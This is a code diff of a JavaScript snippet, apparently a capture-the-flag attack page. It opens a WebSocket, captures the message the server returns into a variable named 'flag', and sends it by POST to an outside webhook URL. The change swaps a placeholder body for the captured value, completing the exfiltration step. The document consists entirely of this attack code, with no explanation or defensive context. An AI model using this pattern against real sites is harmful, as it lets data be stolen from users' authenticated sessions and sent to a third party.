@@ -25,6 +25,7 @@
         socket.addEventListener("open", (event) => {
             socket.send("Hello Server!");
         });
+
         let flag = "";  // Declare a variable to store the received message
 
         socket.onmessage = (event) => {
@@ -38,19 +39,13 @@
         function sendPostToWebhook() {
             console.log("Sending POST request to Webhook");
 
-            // Prepare the message to send to the webhook
-            const payload = {
-                message: "Hello, the WebSocket connection attempt has started, and 'increment' will be sent."
-            };
-
-            // Send POST request to Webhook
+            // Send POST request to Webhook with the flag
             fetch(webhookURL, {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
                 },
-                  body: JSON.stringify("hello")  // Just send the flag directly if it's a string
-
+                body: JSON.stringify(flag)  // Send the flag directly
             })
             .then(response => {
                 if (response.ok) {
